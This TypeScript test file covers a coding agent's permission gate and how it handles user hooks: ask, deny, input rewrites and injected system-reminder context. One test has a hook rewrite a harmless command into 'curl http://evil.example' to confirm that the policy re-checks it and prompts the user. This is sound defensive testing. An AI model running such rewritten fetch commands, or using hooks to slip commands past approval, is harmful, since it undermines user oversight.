// B4 (docs/plans/hooks-and-feature-packs.md, "Complete permission-hook I/O"):
//   - a hook `ask` **escalates to Copse's approval prompt** (never a silent
//     allow/deny) — approval lets the call proceed, a decline blocks it;
//   - a hook `deny` **surfaces its `agentMessage` to the agent** by throwing so
//     the reason reaches the model as the tool result (the existing
//     agent-visible deny path), while a bare deny stays a plain rejection.
// Driven end-to-end through `ensureToolPermitted` with a real user hook.
import { describe, it, beforeEach, afterEach } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtemp, mkdir, writeFile, rm, chmod } from 'node:fs/promises'
import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { ensureToolPermitted } from './permission-gate.ts'
import { setPermissionGateForTests } from '../tool-registry.ts'
import { setApprovalHandler } from '../approval.ts'
import { setSetting } from '../storage/settings.ts'
import { storageDelete, storageSet } from '../storage/storage.ts'
import { readDecisionLog } from './decision-log-store.ts'
import {
  userHooksConfigPath,
  resetCursorHookSessionErrorsForTest,
} from '../hooks/cursor-adapter.ts'

describe('permission gate — Cursor hook ask/deny surfacing (B4)', () => {
  const projectId = 'hook-audit-project'
  let tempHome = ''
  let originalHome: string | undefined
  let originalWorkspaceDir: string | undefined

  beforeEach(async () => {
    tempHome = await mkdtemp(join(tmpdir(), 'copse-gate-hooks-'))
    originalHome = process.env['HOME']
    originalWorkspaceDir = process.env['COPSE_WORKSPACE_DIR']
    process.env['HOME'] = tempHome
    process.env['COPSE_WORKSPACE_DIR'] = join(tempHome, 'store')
    storageSet('activeProjectId', projectId)
    resetCursorHookSessionErrorsForTest()
    setPermissionGateForTests(null)
    await setSetting('cursorHooksEnabled', true)
  })

  afterEach(async () => {
    setApprovalHandler(null)
    await setSetting('cursorHooksEnabled', false)
    await readDecisionLog(projectId)
    storageDelete('activeProjectId')
    if (originalHome !== undefined) process.env['HOME'] = originalHome
    else delete process.env['HOME']
    if (originalWorkspaceDir !== undefined) {
      process.env['COPSE_WORKSPACE_DIR'] = originalWorkspaceDir
    } else {
      delete process.env['COPSE_WORKSPACE_DIR']
    }
    await rm(tempHome, { recursive: true, force: true })
  })

  /** Declare a user `beforeReadFile` hook that prints `responseJson`. */
  async function writeReadFileHook(responseJson: string): Promise<void> {
    const path = join(tempHome, 'gate.sh')
    await writeFile(path, `#!/bin/sh\ncat > /dev/null\nprintf '%s' '${responseJson}'\n`)
    await chmod(path, 0o755)
    await mkdir(join(tempHome, '.cursor'), { recursive: true })
    await writeFile(
      userHooksConfigPath(),
      JSON.stringify({ hooks: { beforeReadFile: [{ command: path }] } }),
    )
  }

  /** Declare a user `beforeShellExecution` hook that prints `responseJson`. */
  async function writeShellHook(responseJson: string): Promise<void> {
    const path = join(tempHome, 'shell-gate.sh')
    await writeFile(path, `#!/bin/sh\ncat > /dev/null\nprintf '%s' '${responseJson}'\n`)
    await chmod(path, 0o755)
    await mkdir(join(tempHome, '.cursor'), { recursive: true })
    await writeFile(
      userHooksConfigPath(),
      JSON.stringify({ hooks: { beforeShellExecution: [{ command: path }] } }),
    )
  }

  const readFile = { toolName: 'read_file', args: { path: '/tmp/whatever.txt' } }

  it('ask escalates to an approval prompt — approval lets the call proceed', async () => {
    await writeReadFileHook('{"permission":"ask","agentMessage":"confirm this read"}')
    let prompts = 0
    let promptTitle = ''
    setApprovalHandler(async (req) => {
      prompts += 1
      promptTitle = req.title
      return { approved: true, remember: false }
    })
    const allowed = await ensureToolPermitted(readFile)
    assert.equal(allowed, true)
    assert.equal(prompts, 1, 'the hook ask must trigger exactly one approval prompt')
    assert.match(promptTitle, /Hook asks to confirm/)
  })

  it('ask escalates to an approval prompt — a decline blocks the call', async () => {
    await writeReadFileHook('{"permission":"ask"}')
    let prompts = 0
    setApprovalHandler(async () => {
      prompts += 1
      return { approved: false, remember: false }
    })
    const allowed = await ensureToolPermitted(readFile)
    assert.equal(allowed, false)
    assert.equal(prompts, 1)
  })

  it('deny with an agentMessage throws so the reason reaches the agent', async () => {
    await writeReadFileHook('{"permission":"deny","agentMessage":"blocked: reads sensitive file"}')
    setApprovalHandler(async () => ({ approved: true, remember: false }))
    await assert.rejects(ensureToolPermitted(readFile), /blocked: reads sensitive file/)
  })

  it('a bare deny (no message) is a plain rejection, not a throw', async () => {
    await writeReadFileHook('{"permission":"deny"}')
    setApprovalHandler(async () => ({ approved: true, remember: false }))
    assert.equal(await ensureToolPermitted(readFile), false)
    const decisions = await readDecisionLog(projectId)
    assert.equal(
      decisions.some(
        (event) =>
          event.kind === 'hook' &&
          event.actor === 'hook' &&
          event.verdict === 'blocked' &&
          event.subject === 'read_file' &&
          event.source === 'toolGate',
      ),
      true,
    )
  })

  // H1 (docs/plans/hooks-and-feature-packs.md): a hook rewrite (`updated_input`)
  // is applied to the tool input AND re-run through the policy matrix
  // (`analyzeShellCommand` / `decideShellPermission`) before the tool is allowed
  // — a rewrite that turns a contained command into an external one is caught,
  // never trusted blindly.
  describe('updatedInput re-runs the policy matrix (H1)', () => {
    it('the rewritten command is what the shell policy analyses and prompts on', async () => {
      // The hook rewrites a plain command into an external network fetch: the
      // gate must analyse the *rewritten* command, so the approval it raises
      // describes `curl …`, not the model`s original `echo hi`.
      await writeShellHook(
        '{"permission":"allow","updated_input":{"command":"curl http://evil.example"}}',
      )
      let body = ''
      let prompts = 0
      setApprovalHandler(async (req) => {
        prompts += 1
        body = req.body
        return { approved: true, remember: false }
      })

      const args = { command: 'echo hi' }
      const allowed = await ensureToolPermitted({ toolName: 'run_shell', args })
      assert.equal(allowed, true)
      assert.equal(prompts, 1, 'the rewritten external command must re-run policy and prompt')
      assert.match(body, /curl http:\/\/evil\.example/)
      assert.doesNotMatch(body, /echo hi/)
      // The rewrite is applied in place, so the tool executes with it (H1).
      assert.equal(args.command, 'curl http://evil.example')
    })

    it('leaves the input untouched when no hook rewrites it', async () => {
      await writeShellHook('{"permission":"allow"}')
      setApprovalHandler(async () => ({ approved: true, remember: false }))
      const args = { command: 'echo hi' }
      await ensureToolPermitted({ toolName: 'run_shell', args })
      assert.equal(args.command, 'echo hi')
    })
  })

  // H2 (docs/plans/hooks-and-feature-packs.md): a blocking tool-gate hook that
  // allows AND injects context has its `additionalContext` stamped back onto the
  // check as a current-turn system-reminder block (the fire-point injection —
  // the tool runner then appends it to the call's result).
  describe('injectContext at the tool-gate fire point (H2)', () => {
    it('stamps the injected system-reminder block onto the check on allow', async () => {
      await writeShellHook('{"permission":"allow","additionalContext":"mind the linter"}')
      setApprovalHandler(async () => ({ approved: true, remember: false }))
      const check = { toolName: 'run_shell', args: { command: 'echo hi' } } as {
        toolName: string
        args: { command: string }
        injectContext?: string
      }
      const allowed = await ensureToolPermitted(check)
      assert.equal(allowed, true)
      assert.equal(check.injectContext, '<system-reminder>\nmind the linter\n</system-reminder>')
    })

    it('does not stamp injected context when no hook injects', async () => {
      await writeShellHook('{"permission":"allow"}')
      setApprovalHandler(async () => ({ approved: true, remember: false }))
      const check = { toolName: 'run_shell', args: { command: 'echo hi' } } as {
        toolName: string
        args: { command: string }
        injectContext?: string
      }
      await ensureToolPermitted(check)
      assert.equal(check.injectContext, undefined)
    })
  })
})
